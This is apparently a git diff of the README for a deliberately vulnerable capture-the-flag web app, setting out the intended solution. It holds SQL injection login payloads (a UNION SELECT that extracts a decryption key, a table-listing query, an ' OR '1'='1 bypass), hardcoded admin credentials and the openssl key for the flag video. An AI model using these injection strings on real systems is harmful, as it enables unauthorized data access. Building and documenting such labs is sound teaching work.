@@ -100,7 +100,9 @@ This app contains intentional vulnerabilities for educational purposes. Do not u
 2. Paste the content above into it.
 3. Update the "Clone the repository" URL with your actual Git repo (if applicable).
 
-###CTF Walkthrough
+----------------------------------------------------------------------------------------------------------------
+
+# CTF Walkthrough
 
 1. Perform SQL Injection
 
@@ -111,9 +113,11 @@ This app contains intentional vulnerabilities for educational purposes. Do not u
 - Access /get_video?id=1 and download secret_video.enc.
 3. Decrypt the Video Using OpenSSL
 
-- openssl aes-256-cbc -d -in secret_video.enc -out secret_video.mp4 -k "OMNI_AI_VIDEO_KEY_619"
+- openssl aes-256-cbc -d -in secret_video.enc -out secret_video.mp4 -k "OMNI_AI_VIDEO_KEY_619" 
 
-4. Watch the Decrypted Video
+[NOTE: this key "OMNI_AI_VIDEO_KEY_619" can be replaced with hash]
+
+4. Watch the Decrypted Video (secret_video.mp4, ie, flag 4)
 
 5. Open secret_video.mp4 and find the next hint.
 
@@ -122,43 +126,37 @@ This app contains intentional vulnerabilities for educational purposes. Do not u
 1. tell them in the previous flag or on the website, username is admin, password is password123, and there are four tables in the web app, their names are users, keys_table, videos, and comments. 
 2. tell them what encryption it is -- aes-256-cbc
 
+# Things for ourselves in submission
+1. See the CTF Walkthrough above. Both key and hash are included. 
+2. XSS is only a bonus/ confusion to the whole CTF.
+
 
 
 # SQL injection 
-### BEST TO INJECT TO GET A LIST OF TABLES FIRST -- this does not work anymore because i hardcode it to return from users[0] so it works to return the decryption key, but if you need below to work, users[3] with the following sql injection command would work. 
-
-1. ' UNION SELECT NULL, NULL, NULL, group_concat(name, char(124)) FROM sqlite_master WHERE type='table' --
-2. return "Flag: users|comments|videos|keys_table | Access /get_video?id=1"
-
 
 ## when doing it properly as a hacker
 1. enter username as admin
 2. enter password as ' UNION SELECT (SELECT decryption_key FROM keys_table LIMIT 1), NULL, NULL, NULL -- 
 3. it will return you with the flag as key, and the location of the video 
+
 ### how do they know the number of fields? BY TRYING, because the prompt will tell them. 
 1. If they did less than the fields, e.g.,
 ' UNION SELECT (SELECT decryption_key FROM keys_table LIMIT 1), NULL, NULL --
 
 It will return " Error: SELECTs to the left and right of UNION do not have the same number of result columns", prompting them to reduce or increase the number of fields. 
 
-
-
-## if you did it without sql injection or incorrectly-- still as admin
-1. enter username as admin, or ' OR '1'='1
-2. enter password as password123, ' OR '1'='1
-3. it will return you a wrong flag, it will display: Flag: admin | Access /get_video?id=1 (location is still correct)
-
-## if you did it without admin 
+## if you did it without knowing username/pwd
 1. enter wrong username or wrong password, it will tell you "ACCESS DENIED: Insufficient clearance."
 
+## if you did it with knowing username/pwd, incorrectly or with the most basic sql injection 
+1. enter username as admin, or ' OR '1'='1
+2. enter password as password123, ' OR '1'='1
+3. it will return you a wrong flag, it will display: Flag: admin | Access /get_video?id=1 
+(!!You get the place of the video, but clearly the flag is still incorrect since you cannot use it to decrypt the video.)
 
 
-Download and decrypt video 
 
-openssl aes-256-cbc -d -in secret_video.enc -out decrypted_video.mp4 -k "OMNI_AI_VIDEO_KEY_619"
-
-
-3. File Setup Instructions
+# File Setup Instructions
 * Encrypt the Video:
 
 openssl aes-256-cbc -e -in secret_video.mp4 -out secret_video.enc -k "OMNI_AI_VIDEO_KEY_619"
@@ -174,10 +172,13 @@ progress
 3. 
 
 TODO Update:
-### experimentwith video encrypt, then serve it on webapp
+#### DONE experiment with video encrypt, then serve it on webapp
+#### DONE need to see what exactly is the decryption key
 #### next flag--   XSS
-#### need to see what exactly is the decryption key
-#### frontend of sql 
+#### DONE frontend of sql  (when i have time i can put in a little jif on sql space, update the time part)
+
+
+
 
 
 
